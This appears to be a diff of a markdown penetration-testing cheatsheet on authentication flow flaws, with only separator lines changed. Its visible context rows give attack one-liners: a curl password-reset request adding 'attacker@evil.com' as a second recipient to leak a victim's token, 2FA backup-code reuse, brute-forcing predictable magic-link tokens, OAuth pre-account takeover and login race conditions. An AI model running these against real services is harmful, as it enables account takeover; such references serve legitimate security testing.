@@ -19,7 +19,7 @@ linked:
 ---
 # Auth Bypass - Flow Logic Flaws
 
-***
+---
 
 ## Password Reset Bypass / Token Leak
 
@@ -37,7 +37,7 @@ linked:
 | `curl -X POST -d "email=victim@target.com,attacker@evil.com" https://target/forgot` | Multi-recipient via email injection | SMTP injection adjacent. |
 ^auth-flow-reset
 
-___
+---
 
 ## 2FA Bypass
 
@@ -56,7 +56,7 @@ ___
 | `curl -X POST -H "Cookie: $C" -d '{"code":"$BACKUP_CODE"}' https://target/api/2fa/verify` × 2 | Backup codes reuse | Single-use violated. |
 ^auth-flow-2fa
 
-___
+---
 
 ## Magic Link Reuse / Tampering
 
@@ -72,7 +72,7 @@ ___
 | `for token in $(generate_predictable_tokens); do curl -sI "https://target/auth?token=$token"; done` | Brute predictable magic tokens | Weak token generation. |
 ^auth-flow-magic
 
-___
+---
 
 ## Email Confirmation Bypass
 
@@ -88,7 +88,7 @@ ___
 | OAuth signup con email victim: Google con `victim@target.com` unverified → signup en target con Google → server crea cuenta con email víctima | Pre-account takeover via OAuth | App no verifica `email_verified` claim. |
 ^auth-flow-email-confirm
 
-___
+---
 
 ## OAuth State / Nonce Missing
 
@@ -105,7 +105,7 @@ ___
 | `curl -sI "https://idp/oauth/authorize?...&prompt=none"` | Silent re-auth | Sesión preexistente bypass. |
 ^auth-flow-oauth-state
 
-___
+---
 
 ## Race Conditions en Auth
 
@@ -121,4 +121,4 @@ ___
 | Turbo Intruder script con `engine=Engine.BURP2, concurrentConnections=1` para login attempts | HTTP/2 single-packet race | Volume + sync. |
 ^auth-flow-race
 
-***
+---
